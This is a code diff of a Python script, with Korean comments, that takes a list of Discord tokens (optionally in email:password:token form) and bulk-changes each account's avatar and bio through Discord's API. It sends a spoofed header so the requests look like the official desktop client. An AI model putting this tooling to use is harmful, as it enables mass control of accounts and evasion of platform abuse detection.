@@ -10,6 +10,15 @@ listdir = os.listdir('avatar')
 image = 'avatar/' + random.choice(listdir)
 png_uri = DataURI.from_file(image)
 
+
+def randstr(lenn):
+    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
+    text = ''
+    for i in range(0, lenn):
+        text += alpha[random.randint(0, len(alpha) - 1)]
+    return text
+
+
 def safeHeader(token):
     return {
         "authority": "discord.com",
@@ -31,20 +40,22 @@ def safeHeader(token):
         "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
     }
 
+
 async def change(token):
-    #avatar에 사진 여러장 넣고 랜덤으로 뽑을거면 위에 listdir~png_uri여기로 옮기셈
-    
+    # avatar에 사진 여러장 넣고 랜덤으로 뽑을거면 위에 listdir~png_uri여기로 옮기셈
+
     jsondata = {
-    # 'username':'Supporter', #username 
-    # 'password' : token.split(':')[1] username하구 password는 토큰 형식이 이메일:비번:토큰 형식이어야함
-    # 같은 원리로 result 리퀘부분에도 token.split(':')[2]로 바꾸셈
-    'avatar': png_uri,
-    'bio':'내소개'
+        # 'username':'Supporter', #username
+        # 'password' : token.split(':')[1] username하구 password는 토큰 형식이 이메일:비번:토큰 형식이어야함
+        # 같은 원리로 result 리퀘부분에도 token.split(':')[2]로 바꾸셈
+        'avatar': png_uri,
+        'bio': '내소개'
     }
-    # data = {'status': "online", 'custom_status': 
+    # data = {'status': "online", 'custom_status':
     # {'text': "외주 받습니다"}} #상메, 상태설정
     try:
-        result = requests.patch('https://discord.com/api/v9/users/@me', json=jsondata, headers=safeHeader(token)).json()
+        result = requests.patch('https://discord.com/api/v9/users/@me',
+                                json=jsondata, headers=safeHeader(token)).json()
         # requests.patch('https://discord.com/api/v9/users/@me/settings', json=data, headers={'Authorization': token}).json()
         if ('avatar' in result):
             print(f'{token} | changed avatar')
@@ -64,7 +75,5 @@ f.close()
 for token in tokens:
     def temp_run():
         asyncio.run(change(token))
-    
-    threading.Thread(target=temp_run, args=()).start()
 
-    
+    threading.Thread(target=temp_run, args=()).start()
